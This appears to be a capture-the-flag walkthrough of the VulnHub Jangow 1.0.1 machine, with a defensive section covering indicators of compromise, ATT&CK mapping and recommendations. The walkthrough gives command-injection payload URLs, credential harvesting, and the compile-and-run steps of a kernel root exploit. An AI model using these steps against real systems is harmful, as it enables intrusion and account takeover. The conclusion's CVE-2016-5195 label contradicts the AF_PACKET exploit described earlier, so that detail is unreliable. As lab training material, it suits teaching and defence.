![Machine](https://img.shields.io/badge/Machine-Jangow_1.0.1-blue?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-VulnHub-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
Overview

This repository contains a full technical walkthrough of the Jangow: 1.0.1 machine from VulnHub.

The objective was to simulate a real-world attack scenario including reconnaissance, service enumeration, exploitation, privilege escalation, and post-exploitation analysis.

In addition to the offensive perspective, this writeup includes a defensive (SOC) analysis covering:

Indicators of Compromise (IOCs)

Relevant log sources

MITRE ATT&CK mapping

Detection and prevention recommendations

The goal of this project is to demonstrate practical cybersecurity skills from both Red Team and Blue Team perspectives.

2. Environment Setup
To ensure a stable and reproducible testing environment, the following configuration was used:

    Target Machine: Jangow: 1.0.1 (Ubuntu-based)

    Virtualization Platform: Oracle VM VirtualBox

    Network Configuration: Bridged Adapter

        Note: Bridged mode is recommended for this machine to ensure proper IP assignment within the local network segment.

    Attacker Machine: Kali Linux
3. Enumeration & Reconnaissance

The initial phase focused on identifying the target within the local network and discovering active services and their versions.
Network Discovery

If the target's IP is unknown in a bridged environment, the following host discovery scan is performed:
Bash

nmap -sn 192.168.0.1/24

Service Scanning

Once the target IP (192.168.0.199) was identified, a comprehensive scan was executed to map the attack surface:
Bash

nmap -sV -p- -sC 192.168.0.199

Scan breakdown:

    -sV: Service version detection.

    -p-: Scan all 65,535 TCP ports.

    -sC: Run default Nmap scripts for vulnerability discovery.
3. Enumeration & Reconnaissance (Continued)
Nmap Scan Results

The full scan of the target 192.168.0.199 yielded the following output:
Plaintext

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 19:39 +0000
Nmap scan report for jangow01.Dlink (192.168.0.199)
Host is up (0.00053s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.3
80/tcp  open  http    Apache httpd 2.4.18
|_http-title: Index of /
| http-ls: Volume /
| SIZE     TIME              FILENAME
| -        2021-06-10 18:05  site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:84:88:1C (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Unix

Technical Analysis

The scan reveals two primary entry points:

    Port 21 (FTP): Running vsftpd 3.0.3. This version is generally stable, but we should check for anonymous login or cleartext credentials later.

    Port 80 (HTTP): Running Apache 2.4.18. The http-ls script shows Directory Listing is enabled, revealing a directory named /site/.

Next Steps

Since the root of the web server provides a directory index, the next logical step is to explore the /site/ directory to identify the web application's functionality and potential vulnerabilities (e.g., hidden files, config files, or RCE).
4. Web Application Analysis

After confirming the presence of a web server, a manual inspection was performed to map the site's structure and identify potential vulnerabilities.
Manual Site Exploration

The /site/ directory contains a standard website layout. A thorough review of the HTML source code was conducted across all pages, but no hidden flags, hardcoded credentials, or developer comments were found.

Key Navigation Links:

    About: Informational page (static content).

    Projects: Portfolio section (static content).

    Buscar: The most interesting entry point.

Identifying the Attack Vector

The Buscar link redirects to a PHP script with a GET parameter:
http://192.168.0.199/site/busque.php?buscar=
Initial Assessment of busque.php

The presence of the ?buscar= parameter suggests that the server is processing user-supplied input. This pattern is often associated with several high-impact vulnerabilities:

    Remote Code Execution (RCE): If the input is passed directly to system shells.

    Local File Inclusion (LFI): If the input is used to fetch local files.

    SQL Injection (SQLi): If the input interacts with a backend database.
  5. Vulnerability Research & Exploitation
Identifying Remote Code Execution (RCE)

The investigation of the buscar parameter revealed that user input is passed directly to a system shell without proper sanitization.

By injecting standard Linux commands into the URL, the server's response confirmed the ability to execute arbitrary code:

    Command: ls

    Payload: http://192.168.0.199/site/busque.php?buscar=ls

Output:
Plaintext

    assets
    busque.php
    css
    index.html
    js
    wordpress

Context Discovery

To determine the current working directory and the privileges of the web server user, the following commands were executed:

    Command: pwd

        Result: /var/www/html/site

        Analysis: This confirms the application is hosted in the standard Apache web root on Ubuntu.

    Command: id (Recommended)

        Analysis: Identifying the user (likely www-data) helps define the scope of the current access and the necessity for privilege escalation.
Post-Exploitation: Information Gathering

Using the discovered RCE, a systematic search for sensitive files and backups was conducted. By chaining commands with ;, it was possible to navigate the file system and read files directly through the web interface.

1. Discovery of the first credential set:
A configuration file was located within the wordpress directory:

    Command: cd wordpress; cat config.php

    Result: * User: desafio02

        Password: abygurl69

2. Credential Testing (FTP):
An attempt to authenticate via FTP using these credentials failed (530 Login incorrect), suggesting that the desafio02 user might be restricted or these credentials only apply to the local database.
Enumerating the Web Root for Backups

Expanding the search to the parent directories of the web server (/var/www/html/) revealed a hidden backup file.

    Command: cd /var/www/html; ls -la (Looking for hidden files)

    Command to read: cat .backup

    Extracted Credentials:

        User: jangow01

        Password: abygurl69 (Password reuse identified)

Successful Initial Access via FTP

Using the second set of credentials, access to the FTP service was successfully established:
Bash

ftp jangow01@192.168.0.199
Connected to 192.168.0.199.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.

FTP Session Analysis:

    Current Directory: The FTP user has access to the /var/www/html directory.

    Impact: This grants Write Access to the web root. We can now upload a more robust web shell or a reverse shell script to gain a stable interactive session.
Privilege Escalation
From Web User to Local User

After gaining FTP access, it was discovered that the credentials jangow01:abygurl69 were also valid for direct system authentication.

    Method: Direct Console/SSH Login

    User: jangow01

    Status: Success

System Enumeration

To identify potential local elevation vectors, the system kernel version was checked:
Bash

jangow01@jangow01:~$ uname -a
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

Vulnerability Analysis:
The kernel version 4.4.0-31 is known to be vulnerable to a critical Local Privilege Escalation (LPE) exploit (Public Exploit: EDB-ID 40871). This vulnerability targets the AF_PACKET implementation in the Linux kernel.
Exploitation (Root Access)

    Transfer: The exploit source code (40871.c) was downloaded to the attacker's machine and transferred to the target's /tmp directory via the established FTP connection.

    Compilation: Following the instructions within the exploit header, the code was compiled using gcc:
    Bash

    gcc chocobo_root.c -o chocobo_root -lpthread

    Execution: Running the compiled binary immediately granted high-level privileges.

Bash

jangow01@jangow01:/tmp$ ./chocobo_root
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

Final Objective Reached: Full administrative control over the target machine.
8. SOC Analysis: Defensive Perspective
Indicators of Compromise (IOCs)

    Files: Presence of 40871.c or unknown binaries in /tmp.

    Account Activity: Unexpected FTP login followed by immediate local shell activity for the jangow01 user.

    Kernel Logs: Potential traces of the memory corruption exploit in /var/log/kern.log.

MITRE ATT&CK Mapping

    T1078 (Valid Accounts): Using leaked credentials for initial access.

    T1068 (Exploitation for Privilege Escalation): Using the 4.4.0-31 kernel exploit to gain root.

    T1552 (Unsecured Credentials): Finding passwords in .backup files.

Recommendations

    Patch Management: Update the Linux kernel to a non-vulnerable version.

    Secret Management: Never store credentials in plaintext or .backup files within the web root.

    Principle of Least Privilege: Ensure the web user cannot access other users' home directories or sensitive system logs.
    Summary & Conclusion

The compromise of the Jangow: 1.0.1 machine followed a classic attack lifecycle:

    Reconnaissance: Identification of an exposed web server and FTP service.

    Exploitation: Leveraging a critical OS Command Injection vulnerability in a custom PHP script (busque.php) to gain Remote Code Execution (RCE).

    Credential Hunting: Discovering plaintext credentials and sensitive backups (.backup) within the web root.

    Privilege Escalation: Exploiting a legacy Linux kernel vulnerability (CVE-2016-5195/Local Privilege Escalation) to move from a standard user to root.

Key Takeaways

    Input Validation is Critical: The primary entry point was a lack of sanitization in a single PHP parameter.

    Credential Hygiene: Password reuse across FTP and system users allowed for easy lateral movement.

    Patching: Maintaining an up-to-date kernel would have prevented the final stage of the attack.
